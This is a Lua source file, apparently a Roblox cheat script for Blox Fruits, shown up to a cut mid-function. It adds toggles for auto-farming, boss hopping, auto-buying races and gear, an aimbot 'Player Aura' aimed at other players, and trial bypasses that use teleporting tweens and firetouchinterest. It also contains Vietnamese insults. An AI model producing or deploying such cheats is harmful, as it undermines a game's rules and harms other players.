MethodFarms = {
    "Level"
}
if Sea3 then
    table.insert(MethodFarms, "Cake Prince")
    table.insert(MethodFarms, "Bone")
end
MethodFarm_Dropdown = FarmTab:AddDropdown(
    {
        Name = "Choose Method To Farm",
        Default = Settings["MethodFarm"],
        Options = MethodFarms,
        Callback = function(Value)
            SaveSettings("MethodFarm", Value)
        end
    }
)
SelectWeaponType_Dropdown = FarmTab:AddDropdown(
    {
        Name = "Select Your Weapon Type",
        Default = Settings["SelectedWeaponType"],
        Flag = "SelectedWeaponType",
        Save = false,
        Options = {
            "Melee",
            "Sword"
        },
        Callback = function(Value)
            lonmemayto = Value
            SaveSettings("SelectedWeaponType", Value)
        end
    }
)
Farm_Toggle = FarmTab:AddToggle(
    {
        Name = "Farm",
        Default = Settings["Farm"],
        Callback = function(v)
            SaveSettings("Farm", v)
        end
    }
)
DoubleQuest_Toggle = FarmTab:AddToggle(
    {
        Name = "Double Quest",
        Default = Settings["Double Quest"],
        Callback = function(memay)
            SaveSettings("Double Quest", memay)
        end
    }
)
local tableselectmobfarm = {}
for i,v in next,game.Workspace.MobSpawns:GetChildren() do
    if not table.find(tableselectmobfarm,v.Name) then
        table.insert(tableselectmobfarm,v.Name)
    end
end
Settings["Selected Mobs"] = Settings["Selected Mobs"] or {}
ngudot2 = Settings["Selected Mobs"] or {}
SelectMobFarm_Dropdown = FarmTab:AddDropdown(
    {
        Name = "Select Mob To Farm",
        Default = "",
        Flag = "tableselectmobfarm",
        Save = false,
        Options = tableselectmobfarm,
        Callback = function(v)
            ngudot2[v] = not ngudot2[v]
            if not ngudot2[v] and table.find(Settings["Selected Mobs"],v) then 
                for i59,v59 in pairs(Settings["Selected Mobs"]) do 
                    if v == v59 then 
                        table.remove(Settings["Selected Mobs"],i59)
                    end
                end
            elseif ngudot2[v] and not table.find(Settings["Selected Mobs"],v) then 
                table.insert(Settings["Selected Mobs"],v)
            end
            Notify(nil,tostring(v).." : "..tostring(ngudot2[v]))
            SaveSettings("Selected Mobs",Settings["Selected Mobs"])
        end
    }
)
FarmMobSelect_Toggle = FarmTab:AddToggle({
    Name = "Auto Farm Mob Selected",
    Default = Settings["Auto Farm Mob Select"],
    Callback = function(v)
        SaveSettings("Auto Farm Mob Select",v)
    end
})
function CheckTushitaGate()
    return not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate")
end
function GetBossTable()
    local a = {"Null"}
    blackboss = {
        "Ice Admiral [Lv. 700] [Boss]",
        "rip_indra [Lv. 1500] [Boss]"
    }
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if (v.Name ~= "Longma [Lv. 2000] [Boss]" or (v.Name == "Longma [Lv. 2000] [Boss]") and CheckTushitaGate()) and string.find(v.Name, ' %pBoss%p') or string.find(v.Name, ' %pRaid Boss%p') and not table.find(blackboss,v.Name) and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            table.insert(a, v.Name)
            if table.find(a,"Null") then
                table.remove(a,1)
            end
        end
    end
    for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
        if (v.Name ~= "Longma [Lv. 2000] [Boss]" or (v.Name == "Longma [Lv. 2000] [Boss]") and CheckTushitaGate()) and string.find(v.Name, ' %pBoss%p') or string.find(v.Name, ' %pRaid Boss%p') and not table.find(blackboss,v.Name) and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            table.insert(a, v.Name)
            if table.find(a,"Null") then
                table.remove(a,1)
            end
        end
    end
    return a
end
SelectBoss_Dropdown = FarmTab:AddDropdown(
    {
        Name = "Select Boss",
        Default = Settings["Selected Boss"],
        Flag = "Selected Boss",
        Save = false,
        Options = GetBossTable(),
        Callback = function(Value)
            SaveSettings("Selected Boss", Value)
        end
    }
)
FarmTab:AddButton({
    Name = "Refresh Bosses",
    Callback = function()
        SelectBoss_Dropdown:Refresh(GetBossTable(),true)
    end
})
FarmBoss_Quest_Toggle = FarmTab:AddToggle(
    {
        Name = "Enable Quest",
        Default = Settings["Auto Quest Boss"],
        Callback = function(v)
            SaveSettings("Auto Quest Boss", v)
        end
    }
)
FarmBoss_Toggle = FarmTab:AddToggle(
    {
        Name = "Farm Boss",
        Default = Settings["Auto Farm Boss"],
        Callback = function(v)
            SaveSettings("Auto Farm Boss", v)
        end
    }
)
FarmBossAll_Toggle = FarmTab:AddToggle(
    {
        Name = "Farm All Boss",
        Default = Settings["Auto Farm All Boss"],
        Callback = function(v)
            SaveSettings("Auto Farm All Boss", v)
        end
    }
)
FarmBossAll_Hop_Toggle = FarmTab:AddToggle(
    {
        Name = "Farm All Boss (Hop)",
        Default = Settings["Auto Farm All Boss (Hop)"],
        Callback = function(v)
            SaveSettings("Auto Farm All Boss (Hop)", v)
        end
    }
)
spawn(function()
    while task.wait() do 
        if Settings["Auto Farm All Boss"] then 
            FarmBoss_Quest_Toggle:Set(true)
            FarmBoss_Toggle:Set(true)
            p = GetBossTable()
            if p[1] ~= "Null" then 
                repeat task.wait()
                    SelectBoss_Dropdown:Refresh(p,true)
                    SelectBoss_Dropdown:Set(p[1])
                until not table.find(GetBossTable(),p[1]) or not Settings["Auto Farm All Boss"] or not ReturnBosses(p[1])
            elseif p[1] == "Null" and Settings["Auto Farm All Boss (Hop)"] then 
                HopServer()
            end
        end
    end
end)
Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Find Fruit",
            Default = Settings["Auto Find Fruit"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Find Fruit", Value)
            end
        }
    )
Swords_MeleeTab:AddToggle(
    {
        Name = "Auto Store Fruit",
        Default = Settings["Auto Store Fruit"],
        Save = false,
        Callback = function(Value)
            SaveSettings("Auto Store Fruit", Value)
        end
    }
)
Swords_MeleeTab:AddToggle(
    {
        Name = "Auto Get Fruit Below 1M To Raid",
        Default = Settings["Auto Get Fruit 1M"],
        Save = false,
        Callback = function(Value)
            SaveSettings("Auto Get Fruit 1M", Value)
        end
    }
)
function AnyDFInBackpack()
    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if string.find(v.Name, "Fruit") then
            return v
        end
    end
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if string.find(v.Name, "Fruit") then
            return v
        end
    end
end
function AnyDFToRaidInbackpack()
    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if string.find(v.Name, "Fruit") and (v:FindFirstChild("Coone") or v:FindFirstChild("Raid Client")) then
            return v
        end
    end
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if string.find(v.Name, "Fruit") and (v:FindFirstChild("Coone") or v:FindFirstChild("Raid Client")) then
            return v
        end
    end
end
function LoadFruit(fruitname)
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", fruitname)
end
FruitAbout1M = {}
for i, v in next, game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
    "GetFruits",
    game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitShop:GetAttribute("Shop2")
) do
    if v.Price >= 1000000 then
        FruitAbout1M[v.Price] = v.Name
    end
end
function getFruitDuoi1M()
    local b
    local b2 = {}
    for i, v in pairs(FruitAbout1M) do
        table.insert(b2, v)
    end
    for i, v in next, game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventory") do
        if v.Type == "Blox Fruit" then
            if not table.find(b2, v.Name) then
                b = v.Name
            end
        end
    end
    return b
end
function AutoGetFruitBelow1M()
    if AnyDFToRaidInbackpack() then return end
    fruit1m = getFruitDuoi1M()
    if fruit1m then 
        LoadFruit(fruit1m)
        --[[
        repeat wait() until CheckTool(fruit1m)
        v5293 = CheckTool(fruit1m)
        local Ignored = Instance.new("IntValue", v5293)
        Ignored.Name = "Raid Client"
        ]]
    end
end
function StoreDFInPath(path)
    for i,v in pairs(path:GetChildren()) do
        if string.find(v.Name,"Fruit") and not v:FindFirstChild("Coone") and not v:FindFirstChild("Raid Client") then
            local Ignored = Instance.new("IntValue", v)
            Ignored.Name = "Coone"
            if v.Name == "Human: Buddha Fruit" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit","Human-Human: Buddha",path:FindFirstChild("Human: Buddha Fruit"))
            elseif v.Name == "Bird: Phoenix Fruit" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit","Bird-Bird: Phoenix",path:FindFirstChild("Bird: Phoenix Fruit"))
            elseif v.Name == "Bird: Falcon Fruit" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit","Bird-Bird: Falcon",path:FindFirstChild("Bird: Falcon Fruit"))
            else
                local test  = string.gsub(v.Name, " Fruit","")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit",string.gsub(v.Name, " Fruit","-"..test),path:FindFirstChild(v.Name))
            end
        end
    end
end
function RemoveStoreNotifcation()
    for i,v in pairs(plr.PlayerGui.Notifications:GetDescendants()) do
        if v:IsA("TextLabel") then
            if string.find(v.Text, "only store") then
                v:Destroy()
            end
        end
    end
end
spawn(function()
    while task.wait() do 
        if Settings["Auto Store Fruit"] then 
            pcall(RemoveStoreNotifcation(),1)
            pcall(function()
                StoreDFInPath(game.Players.LocalPlayer.Backpack)
            end)
            pcall(function()
                StoreDFInPath(game.Players.LocalPlayer.Character)
            end)
            task.wait(10)
        end
    end
end)
if Sea1 then 
    AutoSaber_Toggle =
    Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Saber",
            Default = Settings["Auto Saber"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Saber", Value)
            end
        }
    )
    AutoPoleV1_Toggle =
        Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Pole V1",
            Default = Settings["Auto Pole V1"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Pole V1", Value)
            end
        }
    )
end
if Sea1 or Sea3 then 
    AutoSea2_Toggle =
        Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Sea 2 (New World)",
            Default = Settings["Auto Sea 2"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Sea 2", Value)
            end
        }
    )
end
if Sea3 then 
    AutoEilite_Toggle =
        Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Elite",
            Default = Settings["Auto Elite"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Elite", Value)
            end
        }
    )
    AutoRipIndra_Toggle = Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Rip_Indra",
            Default = Settings["Auto Rip_Indra"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Rip_Indra", Value)
            end
        }
    )
    AutoTushitaToggle = Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Tushita",
            Default = Settings["Auto Tushita"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Tushita", Value)
            end
        }
    )
    StopGodChalice_Toggle=Swords_MeleeTab:AddToggle(
        {
            Name = "Stop When Has God Chalice",
            Default = Settings["StopGodChalice"],
            Save = false,
            Callback = function(Value)
                SaveSettings("StopGodChalice", Value)
            end
        }
    )
    AutoPirateRaid_Toggle = Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Pirate Raid",
            Default = Settings["Auto Pirate Raid"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Pirate Raid", Value)
            end
        }
    )
    AutoFactory_Toggle = Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Factory",
            Default = Settings["Auto Factory"],
            Save = false,
            Callback = function(Value)
                SaveSettings("Auto Factory", Value)
            end
        }
    )
    Swords_MeleeTab:AddToggle(
        {
            Name = "Auto Dough King",
            Default = Settings["AutoDoughKing"],
            Save = false,
            Flag = "AutoDoughKing",
            Callback = function(Value)
                SaveSettings("AutoDoughKing", Value)
            end
        }
    )
end
Swords_MeleeTab:AddSection({Name = "Auto Melee"})
Tablemeleeget = {
    "Superhuman",
    "Sharkman Karate",
    "Death Step",
    "Dragon Talon",
    "Godhuman",
    "Electric Claw"
}
Settings["Melee Choosen"] = Settings["Melee Choosen"] or {}
Swords_MeleeTab:AddDropdown(
    {
        Name = "Choose Melee Auto",
        Default = "",
        Save = false,
        Options = Tablemeleeget,
        Callback = function(Value)
            Settings["Melee Choosen"][Value] = not Settings["Melee Choosen"][Value]
            SaveSettings("Melee Choosen", Settings["Melee Choosen"])
            Notify(nil,"Auto "..tostring(Value)..": "..tostring(Settings["Melee Choosen"][Value]))
        end
    }
)
AutoMelee_Toggle = Swords_MeleeTab:AddToggle({
    Name = "Auto To Melee Choosen",
    Default = Settings["Auto Melee"],
    Callback = function(ggggggggggg)
        SaveSettings("Auto Melee",ggggggggggg)
    end
})
FarmTab:AddDropdown(
    {
        Name = "Type Mastery Farm",
        Default = Settings["TypeMasteryFarm"],
        Save = false,
        Options = {
            "Devil Fruit",
            "Gun"
        },
        Callback = function(Value)
            SaveSettings("TypeMasteryFarm", Value)
        end
    }
)
FarmTab:AddSlider({
	Name = "% Health to send skill",
	Min = 15,
	Max = 75,
	Default = Settings["%HealthSendSkill"],
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "%",
	Callback = function(Value)
		SaveSettings("%HealthSendSkill",Value)
	end    
})
FarmTab:AddToggle(
    {
        Name = "Mastery Farm Option",
        Default = Settings["Mastery Farm"],
        Callback = function(memay)
            SaveSettings("Mastery Farm", memay)
        end
    }
)
Default_Skills = {
    "Z",
    "X",
    "C",
    "V",
    "F"
}
SkillSelected = {}
RealSkillSelected = {}
if Settings["Skill Selected"] then 
    SkillSelected = Settings["Skill Selected"]
end
for i,v in pairs(SkillSelected) do 
    if v then 
        table.insert(RealSkillSelected,i) 
    end
end
FarmTab:AddDropdown(
    {
        Name = "Spam Skill Option",
        Default = "",
        Save = false,
        Options = Default_Skills,
        Callback = function(Value)
            SkillSelected[Value] = not SkillSelected[Value]
            SaveSettings("Skill Selected", SkillSelected)
            RealSkillSelected = {}
            for i,v in pairs(SkillSelected) do 
                if v then 
                    table.insert(RealSkillSelected,i) 
                end
            end
            Notify("GG","Skill '".. tostring(Value) .. "': "..tostring(SkillSelected[Value]).."")
        end
    }
)
FarmTab:AddSection({Name = "Farm Misc"})
FarmTab:AddToggle(
    {
        Name = "Player Aura",
        Default = Settings["PlayerAura"],
        Save = false,
        Flag = "PlayerAura",
        Callback = function(Value)
            PlayerAura = Value
            if Value == false then
                CancelTween()
            end
            SaveSettings("PlayerAura", Value)
        end
    }
)

--[[
        FarmTab:AddToggle(
    {
        Name = "ChoDienCanNguoi",
        Default = Settings["ChoDienCanNguoi"],
        Save = false,
        Flag = "ChoDienCanNguoi",
        Callback = function(Value)
            ChoDienCanNguoi = Value
            if Value == false then
                CancelTween()
            end
            SaveSettings("ChoDienCanNguoi",Value)
        end
    }
)
]]
FarmTab:AddToggle(
    {
        Name = "Player Aura Aimbot (Option)",
        Default = Settings["PlayerAuraAimbot"],
        Save = false,
        Flag = "PlayerAuraAimbot",
        Callback = function(Value)
            if Value == false then
                CancelTween()
            end
            SaveSettings("PlayerAuraAimbot", Value)
        end
    }
)
FarmTab:AddToggle(
    {
        Name = "Player Aura Spam Skill (Option)",
        Default = Settings["PlayerAuraSpamSkill"],
        Save = false,
        Flag = "PlayerAuraSpamSkill",
        Callback = function(Value)
            SaveSettings("PlayerAuraSpamSkill", Value)
        end
    }
)
function u8(fff)
    ToolSe = GetWeapon(fff)
    if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
        wait(.4)
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
end
function EquipWeaponName(fff)
    if not fff then return end 
    NoClip = true
    ToolSe = fff
    if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
        wait(.4)
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
end
function IsWpSKillLoaded(ki)
    if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Skills:FindFirstChild(ki) then
        return true
    end
end
function EquipAllWeapon()
    u3 = {
        "Melee",
        "Blox Fruit",
        "Sword",
        "Gun"
    }
    u3_2 = {}
    for i, v in pairs(u3) do
        u3_3 = GetWeapon(v)
        table.insert(u3_2, u3_3)
    end
    for i, v in pairs(u3_2) do
        if not IsWpSKillLoaded(v) then
            print(v)
            EquipWeaponName(v)
        end
    end
end
function GetWeaponMastery(f)
    local u3 = game.Players.LocalPlayer.Backpack
    for i, v in pairs(u3:GetChildren()) do
        if v.Name == f and v:FindFirstChild("Level") then
            return v.Level.Value
        end
    end
    local u3 = game.Players.LocalPlayer.Character
    for i, v in pairs(u3:GetChildren()) do
        if v.Name == f and v:FindFirstChild("Level") then
            return v.Level.Value
        end
    end
    return nil
end
function u6(kd, kd2)
    if kd2 == nil then
        kd2 = 0
    end
    game:service("VirtualInputManager"):SendKeyEvent(true, kd, false, game)
    wait(kd2)
    game:service("VirtualInputManager"):SendKeyEvent(false, kd, false, game)
end
spawn(
    function()
        while wait() do
            wait()
            if PlayerAura then
                EquipAllWeapon()
                u1 = {}
                for i, v in pairs(game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Skills:GetChildren()) do
                    if v:IsA("Frame") and v.Name ~= "Container" then
                        u1[v.Name] = {}
                        for i2, v2 in pairs(v:GetChildren()) do
                            if v2:IsA("Frame") and v2.Name ~= "Template" then
                                if
                                    v2:FindFirstChild("Level") and v2:FindFirstChild("Title") and
                                        v2.Title.Text ~= "Transformation" and
                                        v2.Title.Text ~= "Shift" and
                                        v.Name ~= "Human-Human: Buddha"
                                 then
                                    k = v2.Level.Text:gsub("Mas. ", "")
                                    k2 = GetWeaponMastery(v.Name)
                                    if k2 ~= nil and tonumber(k) <= GetWeaponMastery(v.Name) then
                                        u1[v.Name][v2.Name] = v2.Cooldown.AbsoluteSize.X
                                    end
                                end
                            end
                        end
                    end
                end
                u2 = {}
                for i, v in pairs(u1) do
                    for i2, v2 in pairs(v) do
                        if v2 == 0 then
                            table.insert(u2, i)
                        end
                    end
                end
                if #u2 > 0 then
                    ReachDiThangNgu = true
                    for i, v in pairs(u2) do
                        print(v)
                    end
                else
                    ReachDiThangNgu = false
                end
            end
        end
    end
)
spawn(
    function()
        while task.wait() do
            if SpamSkills then
                EquipAllWeapon()
                u1 = {}
                for i, v in pairs(game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Skills:GetChildren()) do
                    if v:IsA("Frame") and v.Name ~= "Container" then
                        u1[v.Name] = {}
                        for i2, v2 in pairs(v:GetChildren()) do
                            if v2:IsA("Frame") and v2.Name ~= "Template" then
                                if
                                    v2:FindFirstChild("Level") and v2:FindFirstChild("Title") and
                                        v2.Title.Text ~= "Transformation" and
                                        v2.Title.Text ~= "Shift" and
                                        v.Name ~= "Human-Human: Buddha"
                                 then
                                    k = v2.Level.Text:gsub("Mas. ", "")
                                    k2 = GetWeaponMastery(v.Name)
                                    if k2 ~= nil and tonumber(k) <= GetWeaponMastery(v.Name) then
                                        u1[v.Name][v2.Name] = v2.Cooldown.AbsoluteSize.X
                                    end
                                end
                            end
                        end
                    end
                end
                for i, v in pairs(u1) do
                    for i2, v2 in pairs(v) do
                        if v2 == 0 and SpamSkills then
                            if i2 == "Z" and i == "Magma-Magma" then
                                EquipWeaponName(i)
                                u6(i2, 3)
                            else
                                print(i2, v2)
                                EquipWeaponName(i)
                                u6(i2)
                            end
                        end
                    end
                end
            end
        end
    end
)
FarmTab:AddButton(
    {
        Name = "Black List Current Selected PLayer",
        Callback = function()
            BlackList[SelectedPlayer] = true
        end
    }
)
FarmTab:AddButton(
    {
        Name = "Clear Black List",
        Callback = function()
            BlackList = {}
        end
    }
)

if Sea2 then
    SeaBeastToggle =
        FarmTab:AddToggle(
        {
            Name = "Auto Sea Beast",
            Default = Settings["AutoSeaBeast"],
            Save = false,
            Flag = "AutoSeaBeast",
            Callback = function(Value)
                AutoSeaBeast = Value
                SaveSettings("AutoSeaBeast", Value)
            end
        }
    )
end
local ShopTab =
    Window:MakeTab(
    {
        Name = "Shop",
        Icon = "rbxassetid://4483345999",
        PremiumOnly = false
    }
)
concacmcc = {
    "Electric Claw",
    "Superhuman",
    "Godhuman",
    "Dragon Talon",
    "Death Step",
    "Sharkman Karate"
}
function BuyGhoulRace()
    local args = {
        [1] = "Ectoplasm",
        [2] = "BuyCheck",
        [3] = 4
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    local args = {
        [1] = "Ectoplasm",
        [2] = "Change",
        [3] = 4
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end
ShopTab:AddDropdown(
    {
        Name = "Buy Melee",
        Default = "",
        Options = concacmcc,
        Callback = function(c)
            BuyMelee(c)
        end
    }
)
function RerollRace()
    local args = {
        [1] = "BlackbeardReward",
        [2] = "Reroll",
        [3] = "2"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end
ShopTab:AddButton(
    {
        Name = "Reroll race",
        Callback = function()
            RerollRace()
        end
    }
)
ShopTab:AddButton(
    {
        Name = "Buy Cyborg race",
        Callback = function()
            local args = {
                [1] = "CyborgTrainer",
                [2] = "Buy"
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    }
)
ShopTab:AddButton(
    {
        Name = "Buy Ghoul Race",
        Callback = function()
            BuyGhoulRace()
        end
    }
)
ShopTab:AddButton(
    {
        Name = "Reset Stats",
        Callback = function()
            local args = {
                [1] = "BlackbeardReward",
                [2] = "Refund",
                [3] = "2"
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    }
)
ShopTab:AddButton(
    {
        Name = "Buy Gear",
        Callback = function()
            BuyGear()
        end
    }
)
AutoBuyGear_Toggle = ShopTab:AddToggle(
    {
        Name = "Auto Buy Gear",
        Default = Settings["AutoBuyGear"],
        Save = false,
        Flag = "AutoBuyGear",
        Callback = function(Value)
            AutoBuyGear = Value
            SaveSettings("AutoBuyGear", Value)
        end
    }
)
task.spawn(
    function()
        while task.wait() do
            if AutoBuyGear then
                local function12 = CheckAcientOneStatus()
                if string.find(function12, "Can Buy Gear") then
                    v229, v228, v227 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Check")
                    if v227 and game.Players.LocalPlayer.Data.Fragments.Value >= v227 then
                        BuyGear()
                    end
                end
            end
            task.wait(5)
        end
    end
)
tableRaceDoor = {}
for i,v in pairs(game.Workspace:GetDescendants()) do 
    if string.find(v.Name,"Corridor") then 
        tableRaceDoor[v.Name] = v.Door.Door.RightDoor.Union.CFrame
    end
end
function TweentoCurrentRaceDoor()
    a = tableRaceDoor[game.Players.LocalPlayer.Data.Race.Value .. "Corridor"]
    if (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 2000 then
        repeat
            wait()
            if (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 2000 then
                TweenTemple()
            end
        until (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
            2000
        repeat
            wait()
            if (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 2000 then
                TweenTemple()
            end
        until (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
            2000
        Tweento(a)
    elseif
        (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 2000
     then
        Tweento(a)
    end
end
function GetMagnitude(p1, p2)
    return (p1.Position - p2.Position).Magnitude
end

spawn(
    function()
        while wait() do
            wait()
            if Settings["AutoUpgradeRace"] then
                UpV3NoTween()
                wait(1)
            end
        end
    end
)
if Sea3 then
    --[[
    TrialTab:AddButton(
        {
            Name = "Pull Lever",
            Callback = function()
                PullLever()
            end
        }
    )
    ]]
    AutoChooseGear_Toggle = TrialTab:AddToggle({
        Name = "Auto Choose Gear",
        Default = Settings["Auto Choose Gear"],
        Callback = function(lon)
            SaveSettings("Auto Choose Gear",lon)
        end
    })
    thangchammeci = {
        "Mink",
        "Cyborg",
        "Ghoul",
        "Human",
        "Sky",
        "Fish"
    }
    EnableAllTrial_Toggle =TrialTab:AddToggle(
        {
            Name = "Turn On All Trial Bypass",
            Default = Settings["BypassTrial_All"],
            Callback = function(ngu)
                SaveSettings("BypassTrial_All", ngu)
            end
        }
    )
    thangchammeci2 = {}
    thangchammeci3 = {}
    spawn(
        function()
            while task.wait() do
                for i, v in pairs(thangchammeci2) do
                    table.insert(thangchammeci3, i)
                end
                if thangchammeci3 and #thangchammeci3 >= 6 then
                    for i, v in pairs(thangchammeci3) do
                        thangchammeci2[v]:Set(true)
                    end
                end
                task.wait(15)
            end
        end
    )
    thangchammeci2["BypassTrial_Mink"] =
        TrialTab:AddToggle(
        {
            Name = "Mink",
            Default = Settings["BypassTrial_Mink"],
            Save = false,
            Flag = "BypassTrial_Mink",
            Callback = function(Value)
                if Value == false then
                    CancelTween()
                end
                SaveSettings("BypassTrial_Mink", Value)
            end
        }
    )
    thangchammeci2["BypassTrial_Fish"] =
        TrialTab:AddToggle(
        {
            Name = "Fish",
            Default = Settings["BypassTrial_Fish"],
            Save = false,
            Flag = "BypassTrial_Fish",
            Callback = function(Value)
                if Value == false then
                    CancelTween()
                end
                SaveSettings("BypassTrial_Fish", Value)
            end
        }
    )
    thangchammeci2["BypassTrial_Cyborg"] =
        TrialTab:AddToggle(
        {
            Name = "Cyborg",
            Default = Settings["BypassTrial_Cyborg"],
            Save = false,
            Flag = "BypassTrial_Cyborg",
            Callback = function(Value)
                if Value == false then
                    CancelTween()
                end
                SaveSettings("BypassTrial_Cyborg", Value)
            end
        }
    )
    thangchammeci2["BypassTrial_Sky"] =
        TrialTab:AddToggle(
        {
            Name = "Sky",
            Default = Settings["BypassTrial_Sky"],
            Save = false,
            Flag = "BypassTrial_Sky",
            Callback = function(Value)
                if Value == false then
                    CancelTween()
                end
                SaveSettings("BypassTrial_Sky", Value)
            end
        }
    )
    thangchammeci2["BypassTrial_Human"] =
        TrialTab:AddToggle(
        {
            Name = "Human",
            Default = Settings["BypassTrial_Human"],
            Save = false,
            Flag = "BypassTrial_Human",
            Callback = function(Value)
                BypassTrial_Human = Value
                if Value == false then
                    CancelTween()
                end
                SaveSettings("BypassTrial_Human", Value)
            end
        }
    )
    thangchammeci2["BypassTrial_Ghoul"] =
        TrialTab:AddToggle(
        {
            Name = "Ghoul",
            Default = Settings["BypassTrial_Ghoul"],
            Save = false,
            Flag = "BypassTrial_Ghoul",
            Callback = function(Value)
                if Value == false then
                    CancelTween()
                end
                SaveSettings("BypassTrial_Ghoul", Value)
            end
        }
    )
    spawn(
        function()
            while wait() do
                if Settings["BypassTrial_Cyborg"] then
                    pcall(
                        function()
                            if
                                (CyborgBypassCFrame.Position -
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 2000
                             then
                                Tweento(CyborgBypassCFrame)
                                wait(3)
                            end
                        end
                    )
                end
            end
        end
    )

    spawn(
        function()
            while task.wait() do
                task.wait()
                if Settings["BypassTrial_Mink"] then
                    pcall(
                        function()
                            local TheMazePoint = game:GetService("Workspace").StartPoint
                            if
                                (TheMazePoint.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
                                    500
                             then
                                Tweento(TheMazePoint.CFrame)
                                NoClip = false
                                for i,v in pairs(game:GetDescendants()) do 
                                    if v:IsA("TouchInterest") or v.Name == "TouchInterest" then
                                        if (v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then 
                                            firetouchinterest(v)
                                        end
                                    end
                                end 
                            end
                        end
                    )
                end
            end
        end
    )
    CyborgBypassCFrame =
        CFrame.new(
        -20021.8691,
        10090.4893,
        -16.37994,
        -0.976144373,
        6.71342875e-08,
        -0.217122361,
        8.46145412e-08,
        1,
        -7.1212007e-08,
        0.217122361,
        -8.78849065e-08,
        -0.976144373
    )
    task.spawn(
        function()
            while wait() do
                task.wait()
                if Settings["BypassTrial_Sky"] then
                    pcall(
                        function()
                            local FinishPart = game:GetService("Workspace").Map.SkyTrial.Model.FinishPart
                            if
                                (FinishPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
                                    2000
                             then
                                wait(2)
                                Tweento(FinishPart.CFrame)
                                NoClip = true
                                wait(3)
                            end
                        end
                    )
                end
            end
        end
    )
end
TrialTab:AddSection({Name = "Race"})
AutoUpgradeRace_Toggle =
    TrialTab:AddToggle(
    {
        Name = "Auto Upgrade Race (V1-V2-V3)",
        Default = Settings["AutoUpgradeRace"],
        Save = false,
        Flag = "AutoUpgradeRace",
        Callback = function(Value)
            SaveSettings("AutoUpgradeRace", Value)
            AutoUpgradeRace = Value
        end
    }
)
TrialTab:AddToggle(
    {
        Name = "Auto Do Ghoul Quest (Must In Sea 2)",
        Default = Settings["AutoGhoulQuest"],
        Save = false,
        Flag = "AutoGhoulQuest",
        Callback = function(Value)
            if game.PlaceId == 4442272183 then
                AutoGhoulQuest = Value
                if Value == false then
                    CancelTween()
                end
                SaveSettings("AutoGhoulQuest", Value)
            elseif Value then
                TeleportSea(2)
                return Notify("Script Warning", "Dit Me may bi ngu a? da bao o sea 2 roi", 10)
            end
        end
    }
)
TrialTab:AddToggle(
    {
        Name = "Auto Do Cyborg Quest (Must In Sea 2) (Not Released)",
        Default = Settings["Auto Cyborg"],
        Save = false,
        Flag = "Auto Cyborg",
        Callback = function(Value)
